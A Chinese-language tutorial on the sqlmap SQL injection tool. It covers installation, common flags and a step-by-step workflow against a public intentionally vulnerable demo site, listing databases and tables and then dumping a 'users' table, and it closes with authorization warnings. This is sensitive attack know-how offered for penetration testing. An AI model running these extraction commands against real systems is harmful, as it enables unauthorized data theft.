![file](https://s2.loli.net/2025/04/23/7mhkuPcFdTv5Yg8.png)

## 一、什么是 SQLMAP？

SQLMAP 是一个开源的自动化 SQL 注入工具，用于发现和利用 SQL 注入漏洞，还可以帮助用户接管数据库系统。它由 Python 编写，功能非常强大，适合在授权的渗透测试或安全评估中使用。

项目主页：  
https://github.com/sqlmapproject/sqlmap

---

## 二、SQLMAP 的主要功能

1. 自动识别 SQL 注入漏洞
2. 自动识别数据库类型（MySQL、PostgreSQL、Oracle、MSSQL 等）
3. 获取数据库、数据表、字段等结构信息
4. 提取数据库中的数据
5. 自动识别注入类型（布尔型盲注、时间盲注、联合注入等）
6. 支持代理、Cookie、自定义请求头等参数设置
7. 在具备高权限时支持执行系统命令、读取/写入文件等操作

---

## 三、如何使用 SQLMAP

### 1. 安装

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
```

运行帮助命令：

```bash
python sqlmap.py -h
```

---

### 2. 使用流程（举例）

假设你测试的目标是这个 URL：  
`http://testphp.vulnweb.com/listproducts.php?cat=1`

1. 检测是否存在注入

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch
```

2. 查看数据库列表

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
```

3. 查看某个数据库下的表

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
```

4. 查看表中字段

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
```

5. 导出字段数据

```bash
python sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump
```

---

### 3. 常用参数说明

- `-u`：目标 URL
- `--data`：用于 POST 请求
- `-p`：指定要测试的参数
- `--cookie`：添加 Cookie（例如登录态）
- `--user-agent`：自定义 User-Agent
- `--proxy`：使用代理，如 Burp Suite (`http://127.0.0.1:8080`)
- `--dbs`：列出数据库
- `--tables`：列出数据表
- `--columns`：列出字段
- `--dump`：导出数据
- `--batch`：自动接受默认选项，适合自动化脚本

---

## 四、注意事项

- 仅在授权范围内使用 SQLMAP
- 切勿用于非法入侵或攻击他人系统
- 尽量在测试环境中操作，避免误操作导致数据损坏

